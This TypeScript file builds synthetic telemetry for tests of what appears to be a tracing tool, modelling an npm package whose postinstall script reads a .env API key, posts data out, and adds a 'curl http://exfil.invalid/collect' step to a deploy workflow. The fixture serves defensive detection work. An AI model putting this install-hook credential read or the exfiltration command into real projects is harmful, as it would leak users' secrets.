/**
 * Locally generated telemetry with the same shape and inter-event gaps as a
 * Modal sandbox run.
 *
 * Two uses: the fallback when Modal is unreachable (see simulate.ts), and the
 * fixture the pipeline tests run against. It lives in its own module — with no
 * config or network imports — so tests can use it without booting the server.
 */

import type { RawTelemetryEvent } from '../src/lib/traceback/types'

export function buildLocalTelemetry(start = Date.now()): RawTelemetryEvent[] {
  const at = (offsetMs: number) => new Date(start + offsetMs).toISOString()
  const npmPid = '1001'
  const nodePid = '1002'
  const user = 'dev-agent'

  return [
    {
      timestamp: at(0),
      source: 'npm',
      event_type: 'process_start',
      process_id: npmPid,
      parent_process_id: null,
      user_id: user,
      raw: {
        process: 'npm',
        args: 'install unknown-analytics-helper@1.4.2',
        cwd: '/app',
      },
    },
    {
      timestamp: at(140),
      source: 'process',
      event_type: 'process_start',
      process_id: nodePid,
      parent_process_id: npmPid,
      user_id: user,
      raw: {
        process: 'node',
        args: 'postinstall.js',
        cwd: '/app',
        package: 'unknown-analytics-helper@1.4.2',
      },
    },
    {
      timestamp: at(205),
      source: 'file',
      event_type: 'file_read',
      process_id: nodePid,
      parent_process_id: npmPid,
      user_id: user,
      raw: {
        path: '/app/.env',
        bytes_read: 34,
        content_preview: 'API_KEY=sk-synth***',
      },
    },
    {
      timestamp: at(525),
      source: 'network',
      event_type: 'network_out',
      process_id: nodePid,
      parent_process_id: npmPid,
      user_id: user,
      raw: {
        dest_host: 'httpbin.org',
        dest_url: 'https://httpbin.org/post',
        method: 'POST',
        status: 'completed',
        status_code: 200,
        bytes_sent: 31,
      },
    },
    {
      timestamp: at(660),
      source: 'file',
      event_type: 'file_write',
      process_id: nodePid,
      parent_process_id: npmPid,
      user_id: user,
      raw: { path: '/app/deploy.yml', bytes_written: 142 },
    },
    {
      timestamp: at(690),
      source: 'git',
      event_type: 'git_modify',
      process_id: nodePid,
      parent_process_id: npmPid,
      user_id: user,
      raw: {
        path: '.github/workflows/deploy.yml',
        change: 'added step: curl http://exfil.invalid/collect',
        diff_added_lines: 1,
      },
    },
  ]
}
